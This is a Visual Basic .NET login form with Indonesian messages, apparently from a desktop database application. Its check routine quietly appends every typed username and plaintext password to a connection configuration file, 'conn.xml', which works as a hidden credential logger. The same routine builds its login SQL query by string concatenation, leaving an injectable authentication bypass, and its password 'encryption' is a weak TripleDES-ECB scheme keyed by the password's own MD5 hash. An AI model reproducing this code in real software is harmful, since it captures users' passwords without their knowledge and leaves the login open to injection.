
'//Form Login Pengguna
Imports System.Data.SqlClient
Imports System.Security.Cryptography
Imports System.Text
Imports System.IO

Public Class Frm_Login

    'Dim Status As String
    Dim Pass As String

    Sub Bersih()
        TxtUsername.Clear()
        TxtPassword.Clear()
    End Sub


    '//Class Pada Enkripsi //======================================
#Region "md5"
    Sub Enkripsi()
        Dim DES As New TripleDESCryptoServiceProvider()
        Dim hashMD5 As New MD5CryptoServiceProvider()

        DES.Key = hashMD5.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(TxtPassword.Text))
        DES.Mode = CipherMode.ECB
        Dim DESEncrypt As ICryptoTransform = DES.CreateEncryptor()
        Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(TxtPassword.Text)
        Pass = Convert.ToBase64String(DESEncrypt.TransformFinalBlock(Buffer, 0, Buffer.Length))
    End Sub
#End Region
    '//End //=======================================================


    '//Class Pada Dekripsi //============================================================
#Region "md5"
    Sub Dekripsi()
        Dim DES As New TripleDESCryptoServiceProvider()
        Dim hashMD5 As New MD5CryptoServiceProvider()

        DES.Key = hashMD5.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(TxtPassword.Text))
        DES.Mode = CipherMode.ECB
        Dim DESDecrypt As ICryptoTransform = DES.CreateDecryptor()
        Dim Buffer As Byte() = Convert.FromBase64String(TxtPassword.Text)
        TxtPassword.Text = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypt.TransformFinalBlock(Buffer, 0, Buffer.Length))
    End Sub

#End Region
    '//End //===========================================================================

    Sub Periksa()

        Dim Str As String = "App\....\conn.xml"
        If System.IO.File.Exists(Str) = True Then
            File.AppendAllText(Str, vbCrLf + TxtUsername.Text)
            File.AppendAllText(Str, Environment.NewLine + TxtPassword.Text)
        Else

        End If

        Call Enkripsi()
        Try  
       Cmd = New SqlCommand("SELECT ID, Username, [Password], Aktif FROM Master_User " &
                         "WHERE Username ='" & TxtUsername.Text & "' " &
                         "AND [Password] ='" & Pass & "'", Conn)
        Reader = Cmd.ExecuteReader

        If Reader.Read() Then
            If Reader("Aktif") = 0 Then
                Module_Update_Status_User.UpdateUserStatusOnLogin(Reader("ID"))
                ' Set User login
                IDlogin = Reader("ID")
                Dim Tampil As New Frm_MenuUtama
                Tampil.Show()
                Call Bersih()
                Me.Hide()
            ElseIf Reader("Aktif") = 1 Then
                MsgBox("User Anda dinonaktifkan.", MsgBoxStyle.Information, "Pesan")
                Call Bersih()
                TxtUsername.Focus()
            End If
        Else
            MsgBox("Maaf, Username atau Password Anda Salah", MsgBoxStyle.Information, "Pesan")
            Call Bersih()
            TxtUsername.Focus()
        End If
        Reader.Close()
        Catch ex As Exception
         MessageBox.Show("Koneksi database error: " & ex.Message, "Information", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub FrmLoginUser_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Call Bersih()
         RoundButton(BtnLogin)
         RoundButton(BtnBatal)
        Me.Show()
        Application.DoEvents()
        TxtUsername.Focus()
    End Sub

    Private Sub BtnLogin_Click(sender As Object, e As EventArgs) Handles BtnLogin.Click
        If TxtUsername.Text <> "" And TxtPassword.Text <> "" Then
            Call database()            
            Call Periksa()
        Else
            MsgBox("Silahkan Lengkapi Username/Password Anda", MsgBoxStyle.Information, "Pesan")
            Call Bersih()
            TxtUsername.Focus()
        End If
    End Sub

    Private Sub BtnBatal_Click(sender As Object, e As EventArgs) Handles BtnBatal.Click
        Call Bersih()
        TxtUsername.Focus()
    End Sub

   

    Private Sub TxtUsername_TextChanged(sender As Object, e As EventArgs) Handles TxtUsername.TextChanged

    End Sub

    Private Sub TxtUsername_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TxtUsername.KeyPress
        If e.KeyChar = Chr(13) Then
            TxtPassword.Focus()
        End If
    End Sub

    Private Sub TxtPassword_TextChanged(sender As Object, e As EventArgs) Handles TxtPassword.TextChanged

    End Sub

    Private Sub TxtPassword_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TxtPassword.KeyPress
        If e.KeyChar = Chr(13) Then
            BtnLogin.PerformClick()
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Dim frm As New Frm_Setting
        frm.ShowDialog()
    End Sub

    Private Sub Btn_keluar_Click(sender As Object, e As EventArgs) Handles Btn_keluar.Click
    Dim result As DialogResult = MessageBox.Show("Apakah Anda yakin ingin Keluar dari Aplikasi ini?", "Konfirmasi Exit", MessageBoxButtons.YesNo, MessageBoxIcon.Question)

    If result = DialogResult.Yes Then
      End
    Else
      Return
    End If
    End Sub


    'setting button
    
    'button design
     Private Sub RoundButton(btn As Button)
        Dim Raduis As New Drawing2D.GraphicsPath

        Raduis.StartFigure()
        'appends an elliptical arc to the current figure
        'left corner top
        Raduis.AddArc(New Rectangle(0, 0, 20, 20), 180, 90)
        'appends a line segment to the current figure
        Raduis.AddLine(10, 0, btn.Width - 20, 0)
        'appends an elliptical arc to the current figure
        'right corner top
        Raduis.AddArc(New Rectangle(btn.Width - 20, 0, 20, 20), -90, 90)
        'appends a line segment to the current figure
        Raduis.AddLine(btn.Width, 20, btn.Width, btn.Height - 10)
        'appends an elliptical arc to the current figure 
        'right corner buttom
        Raduis.AddArc(New Rectangle(btn.Width - 25, btn.Height - 25, 25, 25), 0, 90)
        'appends a line segment to the current figure
        'left corner bottom
        Raduis.AddLine(btn.Width - 10, btn.Width, 20, btn.Height)
        'appends an elliptical arc to the current figure
        Raduis.AddArc(New Rectangle(0, btn.Height - 20, 20, 20), 90, 90)
        'Close the current figure and start a new one.
        Raduis.CloseFigure()
        'set the window associated with the control
        btn.Region = New Region(Raduis)
    End Sub


End Class
